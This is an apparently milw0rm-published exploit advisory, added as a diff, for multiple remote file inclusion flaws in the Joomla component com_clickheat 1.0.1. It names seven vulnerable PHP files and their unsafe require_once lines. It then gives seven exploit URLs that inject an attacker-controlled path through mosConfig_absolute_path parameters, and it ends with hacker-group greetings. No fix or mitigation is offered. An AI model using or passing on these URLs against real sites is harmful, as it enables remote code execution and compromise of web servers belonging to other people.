@@ -1,0 +1,73 @@
+=========================================================================================================================================================
+
+
+  [o] Clickheat - Heatmap stats for Joomla! 1.0.1 Multiple Remote File Inclusion Vulnerabilities
+
+       Software : com_clickheat version 1.0.1
+       Vendor   : http://www.recly.com/
+       Download : http://www.recly.com/index.php?option=com_recly&task=product_page&id=1
+       Author   : NoGe
+       Contact  : noge[dot]code[at]gmail[dot]com
+       Blog     : http://evilc0de.blogspot.com
+
+
+=========================================================================================================================================================
+
+
+  [o] Vulnerable file
+
+       administrator/components/com_clickheat/install.clickheat.php
+
+        require_once($GLOBALS['mosConfig_absolute_path']. '/administrator/components/com_clickheat/Recly_Config.php');
+
+       administrator/components/com_clickheat/includes/heatmap/_main.php
+
+        require_once( $mosConfig_absolute_path . '/components/Recly/Clickheat/Clickheat_Heatmap.php' );
+
+       administrator/components/com_clickheat/includes/heatmap/main.php
+
+        require_once( $mosConfig_absolute_path . '/components/Recly/Clickheat/Clickheat_Heatmap.php' );
+
+       administrator/components/com_clickheat/includes/overview/main.php
+
+        require_once( $mosConfig_absolute_path . '/components/Recly/Clickheat/Clickheat_Overview.php' );
+
+       administrator/components/com_clickheat/Recly/Clickheat/Cache.php
+
+        require_once( $GLOBALS['mosConfig_absolute_path'] . '/components/Recly/common/Logger.php');
+
+       administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php
+
+        require_once( $GLOBALS['mosConfig_absolute_path'] . '/components/Recly/common/Logger.php');
+
+       administrator/components/com_clickheat/Recly/common/GlobalVariables.php
+
+        require_once($GLOBALS['mosConfig_absolute_path'].'/components/Recly/common/String.php');
+
+
+
+  [o] Exploit
+
+       http://localhost/[path]/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=[evilcode]
+       http://localhost/[path]/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=[evilcode]
+       http://localhost/[path]/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=[evilcode]
+       http://localhost/[path]/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=[evilcode]
+       http://localhost/[path]/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=[evilcode]
+       http://localhost/[path]/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=[evilcode]
+       http://localhost/[path]/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=[evilcode]
+
+
+=========================================================================================================================================================
+
+
+  [o] Greetz
+
+       MainHack BrotherHood [ http://serverisdown.org/blog/]
+       Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 loqsa
+       H312Y yooogy mousekill }^-^{ kaka11  martfella
+       skulmatic olibekas ulga Cungkee k1tk4t str0ke
+
+        
+=========================================================================================================================================================
+
+# milw0rm.com [2008-11-07]
